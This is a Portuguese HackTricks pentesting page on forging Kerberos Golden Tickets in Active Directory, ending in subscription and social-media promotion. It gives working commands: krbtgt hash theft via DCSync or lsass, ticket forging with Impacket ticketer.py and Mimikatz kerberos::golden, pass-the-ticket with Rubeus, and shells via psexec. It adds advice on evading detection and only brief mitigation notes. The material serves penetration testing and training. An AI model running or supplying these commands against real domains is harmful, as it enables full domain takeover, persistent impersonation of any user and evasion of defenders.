## Golden Ticket

Um **TGT válido como qualquer usuário** pode ser criado **usando o hash NTLM da conta AD krbtgt**. A vantagem de forjar um TGT em vez de um TGS é ser **capaz de acessar qualquer serviço** (ou máquina) no domínio e o usuário que está sendo impersonificado. Além disso, as **credenciais** do **krbtgt** **nunca são alteradas** automaticamente.

O **hash NTLM** da conta **krbtgt** pode ser **obtido** do processo **lsass** ou do arquivo **NTDS.dit** de qualquer DC no domínio. Também é possível obter esse NTLM por meio de um ataque **DCsync**, que pode ser realizado com o módulo [lsadump::dcsync](https://github.com/gentilkiwi/mimikatz/wiki/module-\~-lsadump) do Mimikatz ou o exemplo [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) do Impacket. Geralmente, são necessários **privilégios de administrador de domínio ou similares**, independentemente da técnica utilizada.

Também deve ser levado em conta que é possível E **PREFERÍVEL** (opsec) **forjar tickets usando as chaves Kerberos AES (AES128 e AES256)**.

{% code title="A partir do Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="Do Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

Uma vez que você tenha injetado o **Golden Ticket**, você pode acessar os arquivos compartilhados **(C$)** e executar serviços e WMI, então você pode usar **psexec** ou **wmiexec** para obter um shell (parece que você não pode obter um shell via winrm).

### Bypassando detecções comuns

As formas mais frequentes de detectar um Golden Ticket são **inspecionando o tráfego Kerberos** na rede. Por padrão, o Mimikatz **assina o TGT por 10 anos**, o que se destacará como anômalo em solicitações subsequentes de TGS feitas com ele.

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

Use os parâmetros `/startoffset`, `/endin` e `/renewmax` para controlar o deslocamento de início, duração e o máximo de renovações (todos em minutos).
```
Get-DomainPolicy | select -expand KerberosPolicy
```
Infelizmente, o tempo de vida do TGT não é registrado no 4769, então você não encontrará essa informação nos logs de eventos do Windows. No entanto, o que você pode correlacionar é **ver 4769's sem um 4768 anterior**. Não é possível solicitar um TGS sem um TGT e, se não houver registro de um TGT emitido, podemos inferir que ele foi forjado offline.

Para **burlar essa detecção**, verifique os tickets diamond:

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### Mitigação

* 4624: Logon da conta
* 4672: Logon do administrador
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

Outros truques que os defensores podem fazer é **alertar sobre 4769's para usuários sensíveis**, como a conta padrão do administrador de domínio.

[**Mais informações sobre Golden Ticket em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
